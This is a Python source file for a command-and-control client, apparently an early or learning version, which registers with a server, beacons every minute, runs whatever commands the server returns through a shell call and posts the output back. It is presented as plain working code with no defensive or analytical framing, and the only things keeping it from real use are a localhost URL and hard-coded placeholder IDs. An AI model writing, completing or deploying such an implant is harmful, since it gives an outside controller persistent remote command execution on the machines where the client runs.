import requests
import time
import subprocess

class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = ""
    
    def register(self, username):
        url = f"{self.server_url}/register"
        
        self.client_id = "unique_client_identification_1" # TODO: Retrieve dynamically
        username = "John Doe 1" # TODO: Retrieve dynamically

        payload = {"username": username, "client_id": self.client_id}
        response = requests.post(url, json=payload)
        print(response.json())

    def beacon(self):
        url = f"{self.server_url}/beacon"
        payload = {"client_id": self.client_id}
        
        response = requests.post(url, json=payload)
        commands = response.json().get("commands", [])
        
        return commands

    def report(self, status, result):
        url = f"{self.server_url}/report"
        payload = {"client_id": self.client_id, "status": status, "result": result}
        
        response = requests.post(url, json=payload)
        print(response.json())

    def run(self):
        self.register("John Doe 1")

        while True:
            commands = self.beacon()
            for command in commands:
                result = subprocess.getoutput(command)
                self.report("success", result)
            time.sleep(60)

if __name__ == "__main__":
    client = C2Client("http://localhost:9393")
    client.run()